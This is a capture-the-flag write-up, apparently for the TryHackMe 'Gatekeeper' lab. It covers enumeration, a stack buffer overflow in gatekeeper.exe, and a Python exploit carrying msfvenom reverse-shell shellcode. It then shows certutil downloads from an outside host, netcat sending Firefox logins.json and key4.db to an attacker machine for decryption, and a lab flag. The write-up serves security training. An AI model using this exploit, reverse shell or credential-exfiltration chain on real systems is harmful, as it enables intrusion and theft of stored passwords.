# GateKeeper

## Enumeration 

Start with NMAP
```
┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF]
└─$ nmap -Pn -sV -n -sC --script=vuln  10.48.161.34  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-30 18:47 +1000
Nmap scan report for 10.48.161.34
Host is up (0.42s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
|_ssl-ccs-injection: No reply from server (TIMEOUT)
31337/tcp open  Elite?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
|     Hello
|   GenericLines: 
|     Hello 
|     Hello
|   GetRequest: 
|     Hello GET / HTTP/1.0
|     Hello
|   HTTPOptions: 
|     Hello OPTIONS / HTTP/1.0
|     Hello
|   Help: 
|     Hello HELP
|   Kerberos: 
|     Hello !!!
|   LDAPSearchReq: 
|     Hello 0
|     Hello
|   LPDString: 
|     Hello 
|     default!!!
|   RTSPRequest: 
|     Hello OPTIONS / RTSP/1.0
|     Hello
|   SIPOptions: 
|     Hello OPTIONS sip:nm SIP/2.0
|     Hello Via: SIP/2.0/TCP nm;branch=foo
|     Hello From: <sip:nm@nm>;tag=root
|     Hello To: <sip:nm2@nm2>
|     Hello Call-ID: 50000
|     Hello CSeq: 42 OPTIONS
|     Hello Max-Forwards: 70
|     Hello Content-Length: 0
|     Hello Contact: <sip:nm@nm>
|     Hello Accept: application/sdp
|     Hello
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    Hello
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49167/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31337-TCP:V=7.99%I=7%D=5/30%Time=6A1AA448%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,24,"Hello\x20GET\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r
SF:(SIPOptions,142,"Hello\x20OPTIONS\x20sip:nm\x20SIP/2\.0\r!!!\nHello\x20
SF:Via:\x20SIP/2\.0/TCP\x20nm;branch=foo\r!!!\nHello\x20From:\x20<sip:nm@n
SF:m>;tag=root\r!!!\nHello\x20To:\x20<sip:nm2@nm2>\r!!!\nHello\x20Call-ID:
SF:\x2050000\r!!!\nHello\x20CSeq:\x2042\x20OPTIONS\r!!!\nHello\x20Max-Forw
SF:ards:\x2070\r!!!\nHello\x20Content-Length:\x200\r!!!\nHello\x20Contact:
SF:\x20<sip:nm@nm>\r!!!\nHello\x20Accept:\x20application/sdp\r!!!\nHello\x
SF:20\r!!!\n")%r(GenericLines,16,"Hello\x20\r!!!\nHello\x20\r!!!\n")%r(HTT
SF:POptions,28,"Hello\x20OPTIONS\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n"
SF:)%r(RTSPRequest,28,"Hello\x20OPTIONS\x20/\x20RTSP/1\.0\r!!!\nHello\x20\
SF:r!!!\n")%r(Help,F,"Hello\x20HELP\r!!!\n")%r(SSLSessionReq,C,"Hello\x20\
SF:x16\x03!!!\n")%r(TerminalServerCookie,B,"Hello\x20\x03!!!\n")%r(TLSSess
SF:ionReq,C,"Hello\x20\x16\x03!!!\n")%r(Kerberos,A,"Hello\x20!!!\n")%r(Fou
SF:rOhFourRequest,47,"Hello\x20GET\x20/nice%20ports%2C/Tri%6Eity\.txt%2eba
SF:k\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r(LPDString,12,"Hello\x20\x01de
SF:fault!!!\n")%r(LDAPSearchReq,17,"Hello\x200\x84!!!\nHello\x20\x01!!!\n"
SF:);
Service Info: Host: GATEKEEPER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 262.43 seconds
                                                                                 
┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF]
```
Interesting ITEMS: 
- SMB 135,139,445 likely host is Windows
- RDP 3389
- Elite? 31337
- 49152/tcp open  msrpc        Microsoft Windows RPC
- 49153/tcp open  msrpc        Microsoft Windows RPC
- 49154/tcp open  msrpc        Microsoft Windows RPC
- 49167/tcp open  msrpc        Microsoft Windows RPC
- Scan results include 'Hello GET /nice ports,/Trinity.txt.bak HTTP/1.0'

## Elite 31337 check with netcat

A quick lookupsids check discovered several uses of interest:
```
└─$ impacket-lookupsid guest@10.49.174.148
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
...
500: GATEKEEPER\Administrator (SidTypeUser)
501: GATEKEEPER\Guest (SidTypeUser)
513: GATEKEEPER\None (SidTypeGroup)
1000: GATEKEEPER\mayor (SidTypeUser)
1001: GATEKEEPER\HomeUsers (SidTypeAlias)
1002: GATEKEEPER\HomeGroupUser$ (SidTypeUser)
1003: GATEKEEPER\natbat (SidTypeUser)
```


A quick look show this is likely out target for buffer overflow exploit
```
┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF/GateKeeper]
└─$ nc 10.48.161.34 31337             
Hello !!!
TEST
Hello TEST!!!
help
Hello help!!!
```

## SMB seems first place to look, found gatekeeper.exe file download and test next
```
┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF]
└─$ smbclient -L 10.48.161.34 -L
Password for [WORKGROUP\hacktopuser]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.48.161.34 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
...
└─$ smbclient  \\\\10.48.161.34\\Users
...
smb: \> ls
...
  Default                           DHR        0  Tue Jul 14 17:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 14:54:24 2009
  Share                               D        0  Fri May 15 11:58:07 2020

                7863807 blocks of size 4096. 3832464 blocks available
smb: \> cd Share
smb: \Share\> ls
...
  gatekeeper.exe                      A    13312  Mon Apr 20 15:27:17 2020
...
smb: \Share\> GET gatekeeper.exe
getting file \Share\gatekeeper.exe of size 13312 as gatekeeper.exe (6.1 KiloBytes/sec) (average 6.1 KiloBytes/sec)
```

## Quick check of gatekeeper.exe file

Transferred to Windows 8 PC and installed the VCRUNTIME140.dll for C++ support. Then run and sure enough its same port 31337. VIA quick nmap scan.
Server side:
```
[+] Listening for connections.
Received connection from remote host.
Connection handed off to handler thread.
Bytes received: 1       <--no response  at first on client end pressed enter displays Hello!!!
Bytes sent: 47          <--put in a-z1-0 and enter 47 characters
Client disconnected.    <--ctrl C client end no surprise
```
Client side:
```
┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF/GateKeeper]
└─$ nc 192.168.0.199 31337     

Hello !!!
abcdefghijklmnopqrstuvwxyz12334567890
Hello abcdefghijklmnopqrstuvwxyz12334567890!!!
```

## Iterate for point of failure of input
- Tart with python script for sending characters volume to determine how much will crash it. 
- Use immunity debugger to observe EIP or for crash.
- It crashes between 100 and 150 I will use msf-pattern to determine exact location
- Another tool I should have considered called cyclic, similar create with 'cyclic 200' find 'cyclic -l che3' to get location same results just long time since tried it.

```
┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF/BrainStorm]
└─$ msf-pattern_create -l 150   
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
...                                                                                 
┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF/BrainStorm]
└─$ nc 192.168.0.199 31337
                                <---mandatory return line 
Hello !!!
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
...                                                                                 
```
Immunity Debugger gave EIP 39654138 now use msf-patter-offset we find 146 characters before EIP
```
┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF/BrainStorm]
└─$ msf-pattern_offset -q 39654138

[*] Exact match at offset 146
```
Based on this a simple script now contains the following where, BBBB will be our return location later and payload made after badchars checked.
```
import socket
import sys

message = b'A' * 146 + b'B' * 4
nops = b"/x90" * 20
payload = b""

try: 
	print("Sending payload:...")
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.0.199',31337))
	s.send((message + nops + payload + b'\r\n'))
	s.close()

except:
	print("Cannot connect to the server")
	sys.exit()
```
And a quick tests show using BBBB as a return address, we are on target using 146 as padding before EIP, with nop sled after to shell code.
```
EAX FFFFFFFF
ECX 61D56613
EDX 00000000
EBX 0058D030
ESP 003719F0 ASCII "/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90
!!!
"
EBP 41414141
ESI 08041470 gatekeep.08041470
EDI 0058D030
EIP 42424242
```
## Bad char testing

Sent \x01 through to \xFF to look for characters that did not show, Immunity did show full black squares for \x21 and \xFE but on restest by inserting b"\x21\xFE\x21\xFE" before BBBB pushing it beyond it. I could see !■!■ in there place so not bad after all. I will move on assuming only \x00 is bad.

```
00601A80   41414141  AAAA
00601A84   41414141  AAAA
00601A88   41414141  AAAA
00601A8C   FE21FE21  !■!■
00601A90   42424242  BBBB
...
```
Running mona modules it looks like the only candidate for attack is not a DLL its the gatekeeper.exe file itself being the only one with ASLR and NXcompat disabled.
```
- Nr of modules displayed after filters: **21**
- PEB order: **InLoadOrder**

| Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | CFG   | NXCompat | OS Dll | Details                                                                                                            |
| ---------- | ---------- | ---------- | ------ | ------- | ----- | ----- | -------- | ------ | ------------------------------------------------------------------------------------------------------------------ |
| 0x731b0000 | 0x731b4000 | 0x00004000 | True   | False   | True  | False | True     | True   | 10.0.10240.16390 [api-ms-win-crt-convert-l1-1-0.dll] (C:\Windows\SYSTEM32\api-ms-win-crt-convert-l1-1-0.dll) 0x540 |
| 0x08040000 | 0x08048000 | 0x00008000 | False  | True    | False | False | False    | False  | -1.0- [gatekeeper.exe] (C:\Users\Administrator\Desktop\TRYHACKME CTF\Gatekeeper\gatekeeper.exe) 0x8000             |
| 0x731c0000 | 0x731c4000 | 0x00004000 | True   | False   | True  | False | True     | True   | 10.0.10240.16390 [api-ms-win-crt-string-l1-1-0.dll] (C:\Windows\SYSTEM32\api-ms-win-crt-string-l1-1-0.dll) 0x540   |
| 0x75820000 | 0x75861000 | 0x00041000 | True   | True    | True  | True  | True     | True   | 6.3.9600.17415 [sechost.dll] (C:\Windows\SYSTEM32\sechost.dll) 0x4140                                              |
| 0x75540000 | 0x75547000 | 0x00007000 | True   | False   | True  | True  | True     | True   | 6.3.9600.17415 [NSI.dll] (C:\Windows\SYSTEM32\NSI.dll) 0x4540                                                      |
| 0x77480000 | 0x775c0000 | 0x00140000 | True   | True    | True  | True  | True     | True   | 6.3.9600.17415 [KERNEL32.DLL] (C:\Windows\SYSTEM32\KERNEL32.DLL) 0x4140                                            |
| 0x77a50000 | 0x77bbe000 | 0x0016e000 | True   | True    | True  | True  | True     | True   | 6.3.9600.17415 [ntdll.dll] (C:\Windows\SYSTEM32\ntdll.dll) 0x4140                                                  |
| 0x73210000 | 0x73214000 | 0x00004000 | True   | False   | True  | False | True     | True   | 10.0.10240.16390 [api-ms-win-crt-stdio-l1-1-0.dll] (C:\Windows\SYSTEM32\api-ms-win-crt-stdio-l1-1-0.dll) 0x540     |
| 0x75990000 | 0x75a67000 | 0x000d7000 | True   | True    | True  | True  | True     | True   | 6.3.9600.17415 [KERNELBASE.dll] (C:\Windows\SYSTEM32\KERNELBASE.dll) 0x4140                                        |
| 0x77370000 | 0x773c0000 | 0x00050000 | True   | True    | True  | True  | True     | True   | 6.3.9600.17415 [WS2_32.dll] (C:\Windows\SYSTEM32\WS2_32.dll) 0x4140                                                |
| 0x730d0000 | 0x731ac000 | 0x000dc000 | True   | True    | True  | True  | True     | True   | 10.0.10240.16390 [ucrtbase.DLL] (C:\Windows\SYSTEM32\ucrtbase.DLL) 0x4140                                          |
| 0x751e0000 | 0x75234000 | 0x00054000 | True   | True    | True  | True  | True     | True   | 6.3.9600.17415 [bcryptPrimitives.dll] (C:\Windows\SYSTEM32\bcryptPrimitives.dll) 0x41c0                            |
| 0x731d0000 | 0x731d3000 | 0x00003000 | True   | False   | True  | False | True     | True   | 10.0.10240.16390 [api-ms-win-crt-heap-l1-1-0.dll] (C:\Windows\SYSTEM32\api-ms-win-crt-heap-l1-1-0.dll) 0x540       |
| 0x75240000 | 0x7524a000 | 0x0000a000 | True   | False   | True  | True  | True     | True   | 6.3.9600.17415 [CRYPTBASE.dll] (C:\Windows\SYSTEM32\CRYPTBASE.dll) 0x4540                                          |
| 0x73200000 | 0x73204000 | 0x00004000 | True   | False   | True  | False | True     | True   | 10.0.10240.16390 [api-ms-win-crt-runtime-l1-1-0.dll] (C:\Windows\SYSTEM32\api-ms-win-crt-runtime-l1-1-0.dll) 0x540 |
| 0x73470000 | 0x734bb000 | 0x0004b000 | True   | True    | True  | True  | True     | True   | 6.3.9600.17415 [mswsock.dll] (C:\Windows\system32\mswsock.dll) 0x4140                                              |
| 0x731e0000 | 0x731e3000 | 0x00003000 | True   | False   | True  | False | True     | True   | 10.0.10240.16390 [api-ms-win-crt-locale-l1-1-0.dll] (C:\Windows\SYSTEM32\api-ms-win-crt-locale-l1-1-0.dll) 0x540   |
| 0x75ab0000 | 0x75b6a000 | 0x000ba000 | True   | True    | True  | True  | True     | True   | 6.3.9600.17415 [RPCRT4.dll] (C:\Windows\SYSTEM32\RPCRT4.dll) 0x4140                                                |
| 0x75250000 | 0x7526e000 | 0x0001e000 | True   | True    | True  | True  | True     | True   | 6.3.9600.17415 [SspiCli.dll] (C:\Windows\SYSTEM32\SspiCli.dll) 0x4140                                              |
| 0x73220000 | 0x73235000 | 0x00015000 | True   | True    | True  | True  | True     | True   | 14.44.35211.0 [VCRUNTIME140.dll] (C:\Windows\SYSTEM32\VCRUNTIME140.dll) 0x4140                                     |
| 0x731f0000 | 0x731f5000 | 0x00005000 | True   | False   | True  | False | True     | True   | 10.0.10240.16390 [api-ms-win-crt-math-l1-1-0.dll] (C:\Windows\SYSTEM32\api-ms-win-crt-math-l1-1-0.dll) 0x540       |
----------
```
Next use mona command bar to search for JMP ESP in gatekeeper.exe using 
```
!mono -s "\xff\xe4" -m gatekeeper.exe
```
what two locations showed up
```
...
## Results stored in find.md file in program filesx86/Immunity Inc/immunity Debugger/ folder.
...
0x080414c3 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [gatekeeper] ASLR: False, Rebase: False, SafeSEH: True, CFG: False, OS: False, v-1.0- (C:\Users\Administrator\Desktop\TRYHACKME CTF\Gatekeeper\gatekeeper.exe), 0x8000
0x080416bf : "\xff\xe4" |  {PAGE_EXECUTE_READ} [gatekeeper] ASLR: False, Rebase: False, SafeSEH: True, CFG: False, OS: False, v-1.0- (C:\Users\Administrator\Desktop\TRYHACKME CTF\Gatekeeper\gatekeeper.exe), 0x8000
```
I will now use the first one location of JMP ESP at 0x080414c3 in payload. But that must be in reverse b"\xc3\x14\x04\x08"

Using a shell code generated by msfvenom with payload windows/shell_reverse_tcp with -b set to "\x00" and -f set to c. Its worth noting a windows/meterpreter/reverse_tcp shell will also work and is definitely faster for escallating with getsystem command, but its not required for this module.
```
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=LPORT -f c -b "\x00"   
```

Here is the script that I used to gain a shell on target:
```
import socket
import sys

message = b'A' * 146 + b"\xc3\x14\x04\x08"
nops = b"\x90" * 32
payload = (b"\xba\x10\xc5\x11\x1a\xdd\xc3\xd9\x74\x24\xf4\x5e\x2b\xc9"
... 
b"\xb5\xf4\xe4\x1d\xb0\xb1\xa2\xce\xc8\xaa\x46\xf0\x7f\xca"
b"\x42")

try: 
	print("Sending payload:...")
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('THM_TARGET',31337))
	s.send((message + nops + payload + b'\r\n'))
	s.close()

except:
	print("Cannot connect to the server")
	sys.exit()
```
On gaining connection with netcat listener (metasploit exploit/multi/handler listener also option)
```
└─$ nc -lnvp 8443        
listening on [any] 8443 ...
connect to [<attackerIP>] from (UNKNOWN) [TMN_Target] 49237
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\natbat\Desktop>dir
...
04/21/2020  05:00 PM             1,197 Firefox.lnk
04/20/2020  01:27 AM            13,312 gatekeeper.exe
04/21/2020  09:53 PM               135 gatekeeperstart.bat
05/14/2020  09:43 PM               140 user.txt.txt
               4 File(s)         14,784 bytes
               2 Dir(s)  15,886,802,944 bytes free

C:\Users\natbat\Desktop>type user.txt.txt
type user.txt.txt
{H4lf_W4y_Th3r3}

The buffer overflow in this room is credited to Justin Steven and his 
"dostackbufferoverflowgood" program.  Thank you!
C:\Users\natbat\Desktop>
```
Answer Q1 Task 2: {H4lf_W4y_Th3r3} user.text file flag

Other two files gatekeeper.* were likely a deadend
```
C:\Users\natbat\Desktop>type Firefox.lnk
L�F�  �j7�▒��j7�▒����   ����DG▒Yr?�D��U��k0�~tCFSF1�P▒� AppDatat▒Y^���H�g3��(����ߟgVA�G��k��ﾕP��P▒�*�AppDataBL1�P� LocalﾕP��P�*TULocald1�P� MOZILL~1ﾕP��P�*�sMozilla Firefox▒^2���P5�  firefox.exeﾕP��P�*�sfirefox.exe▒�-8_KԾ:C:\Users\'\\GATEKEEPER\Usersnatbat\AppData\Local\Mozilla Firefox\firefox.exe,..\AppData\Local\Mozilla Firefox\firefox.exe-C:\Users\natbat\AppData\Local\Mozilla Firefox
                                                                 �|��I�J�H��K��`����'t�1��8rj�8  ��1SPS��XF�L8C���&�m�m.S-1-5-21-663372427-3699997616-3390412905-1003b1SPSU(L�y�9K����-���

                        ��54B4832DCE3D0EB51
C:\Users\natbat\Desktop>type gatekeeperstart.bat
@echo off
:start 
start /w C:\Users\natbat\Desktop\gatekeeper.exe
::Wait 90 seconds before restarting.
TIMEOUT /T 5
GOTO:Start
```

Note the firefox.lnk file is a clue for the root.txt file later, the gatekeeper.exe file is same as one obtained from SMB share and the .bat file is a used for running gatekeeper also a likely option for depending on permissions of process calling it. 

## Escallation 
Tried several things without success
- I uploaded winPEAS.exe for some reason not able to run it, renaming it did not help. I should have tried signature change.
- whoami /priv showed no significant privilege on natbat user.
- searched for Trinity.txt.bak from nmap scan for signs without luck

### Whois and Trinity.txt check
```
C:\Users\natbat\Desktop>whoami
gatekeeper\natbat

C:\Users\natbat\Desktop>whoami /priv
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

C:\Users\natbat\Desktop>dir \Trinity.txt.bak /s /b 2>nul

C:\Users\natbat\Desktop>dir \Trinity.* /s /b 2>nul
```

### Tested winPEAS.exe and it failed to run, 
- Powershell appeared extremely unstable also.
- Did find one user name mayor in process:
```
c:\Users>dir    
...
04/19/2020  11:55 AM    <DIR>          mayor
05/14/2020  09:58 PM    <DIR>          natbat
05/14/2020  09:54 PM    <DIR>          Public
05/14/2020  09:58 PM    <DIR>          Share
...
c:\Users\natbat\Documents>certutil -urlcache -f http://192.168.159.255:8000/winPEASx86.exe winPEAS.exe
certutil -urlcache -f http://192.168.159.255:8000/winPEASx86.exe winPEAS.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

c:\Users\natbat\Documents>dir
...
5/30/2026  10:39 AM        11,132,416 winPEAS.exe
...
c:\Users\natbat\Documents>WinPEAS.exe > WinPEAS.txt
WinPEAS.exe > WinPEAS.txt

C:\Users\natbat\Documents>powershell
powershell
Windows PowerShell 
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

# Froze after start.
```
Checked Scheduled tasks, sc and start up files, too many or just no obvious wins here:
```
 C:\Users\natbat\Desktop>schtasks /query /fo /LIST /v
 # OR tasks running as system
 schtasks /query /fo LIST /v | findstr /i "SYSTEM"
 # OR search for exe run in user folders  
 schtasks /query /fo LIST /v | findstr /i "C:\Users"
 # OR
 C:\Users\natbat\Desktop>schtasks
 # OR
 sc query
 # OR
 dir "c:\programData\microsoft\windows\start menu\programs\startup
```
What i dismissed was icacl search the two files in the folder gatekeeper exe and bat.
```
icacls "C:\Users\natbat\desktop\gatekeeper.exe" # or .bat
```
## Firefox had to be looked at more carefully

It was widely known that credentials can be obtained from firefox, so searching around I found firefox decryptor for credentials, the main files of interest were logins.json and key4.db to use the decryptor.

Script for decryptor 
```
sudo git clone https://github.com/unode/firefox_decrypt/   
```
Files required are located in:
```
C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release
```
Netcat was uploaded with certutil in documents folder of natbat. Then used to upload files to attack PC for decryption:
Where in most default kali install nc.exe is installed at:
```
/usr/share/windows-resources/binaries
#set up simple server and call with certutil from target
Then download the logins.json and key4.db
# Using netcat to send:
C:\Users\natbat\Documents>nc.exe -nv Attacker_IP PORT < logins.json
# To Receive
└─$ sudo nc -lnvp PORT > logins.json
```





